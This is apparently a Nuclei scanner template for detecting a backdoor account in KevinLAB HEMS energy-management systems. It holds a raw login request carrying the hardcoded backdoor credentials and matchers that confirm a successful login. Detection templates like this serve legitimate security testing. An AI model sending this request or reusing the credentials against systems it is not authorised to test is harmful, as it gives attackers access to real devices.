id: kevinlab-hems-backdoor

info:
  name: KevinLAB HEMS - 后门检测
  author: gy741
  severity: critical
  description: 该模板用于检测目标是否存在与 KevinLAB HEMS - Backdoor Detection 相关的后门或恶意植入特征。命中通常意味着系统已被入侵，攻击者可能具备持久化控制、命令执行或敏感信息获取能力。
  reference:
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php
  metadata:
    max-request: 1
  tags: kevinlab,default-login,backdoor,vuln

http:
  - raw:
      - |
        POST /dashboard/proc.php?type=login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        Accept-Encoding: gzip, deflate
        Connection: close

        userid=kevinlab&userpass=kevin003

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '<meta http-equiv="refresh" content="0; url=/"></meta>'

      - type: word
        words:
          - '<script> alert'
        negative: true

      - type: word
        part: header
        words:
          - 'PHPSESSID'

      - type: status
        status:
          - 200
